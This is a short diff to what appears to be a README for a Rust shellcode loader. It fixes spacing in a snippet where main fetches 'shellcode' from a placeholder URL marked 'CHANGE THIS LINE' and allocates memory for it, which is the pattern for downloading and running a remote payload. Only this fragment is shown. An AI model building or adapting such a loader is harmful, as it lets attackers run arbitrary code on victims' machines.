@@ -86,7 +86,7 @@ The `main` function coordinates the program:
 fn main() {
     unsafe {
 
-        let url= String::from("http://127.0.0.1:8080/shellcode"); // CHANGE THIS LINE
+        let url = String::from("http://127.0.0.1:8080/shellcode"); // CHANGE THIS LINE
         let shellcode = fetch_payload(&url).unwrap();
         let dwsize = shellcode.len();
         let pointer = allocate_memory(dwsize);
